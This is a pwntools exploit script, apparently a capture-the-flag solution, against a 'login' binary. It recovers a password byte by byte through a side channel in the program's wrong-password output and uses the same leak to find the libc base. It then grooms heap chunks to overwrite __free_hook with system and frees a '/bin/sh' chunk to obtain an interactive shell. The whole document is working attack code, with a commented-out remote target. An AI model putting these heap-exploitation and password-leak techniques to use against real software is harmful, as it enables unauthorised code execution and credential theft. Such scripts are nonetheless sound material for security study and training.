from pwn import *

libc = ELF("./libc_login.so")
io = process("./login")
#io = remote("xx.xxx.xxx.xx", xxxxx)

def add_user(idx, user_id, password):
    io.sendlineafter(b">> ", b'1')
    io.sendlineafter(b"Input user index: ", str(idx).encode())
    io.sendlineafter(b"Input id: ", str(user_id).encode())
    io.sendlineafter(b"Input password len: ", str(len(password)).encode())
    io.sendafter(b"Input password: ", password)
    io.recvuntil(b"Add user done!\n")

def login_user(idx, password):
    io.sendlineafter(b">> ", b'2')
    io.sendlineafter(b"Input user index: ", str(idx).encode())
    io.sendafter(b"Input password: ", password)

def delete_user(idx):
    io.sendlineafter(b">> ", b'3')
    io.sendlineafter(b"Input user index: ", str(idx).encode())
    io.recvuntil(b"Delete user done!\n")

def delete_victim(idx):
    io.sendlineafter(b"Input victim index: ", str(idx).encode())
    io.recvuntil(b"Delete victim done!")

def sca_login(idx, password_len, lowest_possible_val, highest_possible_val):
    password = b""
    for correct_len in range(password_len):
        if len(password) != correct_len:
            log.error("Error occurs while getting password")
            break
        for guess_byte in range(lowest_possible_val, highest_possible_val + 1):
            if guess_byte != ord('\n'):
                if correct_len != password_len - 1:
                    login_user(idx, password + p8(guess_byte) + b'j' * (0x98 - (correct_len + 1)))
                    io.recvuntil(b"Wrong password: ")
                    io.recv(0x98)
                    real_correct_len = u8(io.recv(1))

                    # 长度为0时，不会打印出real_correct_len
                    if correct_len == 0 and real_correct_len == ord('\n'):
                        real_correct_len = 0
                    log.success("c_len = " + hex(correct_len) + ", " + "rc_len = " + hex(real_correct_len))

                    # 假如上面的j字符正好也才对了，就是大于的情况
                    if real_correct_len >= correct_len + 1: 
                        log.success("Found: " + hex(guess_byte))
                        password += p8(guess_byte)
                        break
                else:
                    login_user(idx, password + p8(guess_byte) + b'\n')
                    if io.recvuntil(b'\n', drop=True) == b"Login success!":
                        log.success("Found: " + hex(guess_byte))
                        password += p8(guess_byte)
                        break
    log.success("password for user " + str(idx) + " = " + str(password))
    return password

for i in range(1, 9):
    add_user(i, i, str(i).encode() * 6)
for i in range(7):
    delete_user(8 - i)

sca_login(0, 0x30, 48, 48 + 79 - 1)
delete_victim(1)

libc.address = u64(sca_login(1, 6, 0x1, 0xff).ljust(8, b'\x00')) - 0x3ebca0
log.success("libc.address = " + hex(libc.address))

for i in range(2, 9):
    add_user(i, i, str(i).encode() * 6)
add_user(10, 10, b"jkilopu")

delete_user(1)
delete_user(10)

add_user(11, 11, p64(libc.symbols["__free_hook"]))
add_user(12, 12, b"/bin/sh")
add_user(13, 13, p64(libc.symbols["system"]))

io.sendlineafter(b">> ", b'3')
io.sendlineafter(b"Input user index: ", str(12).encode())

io.interactive()
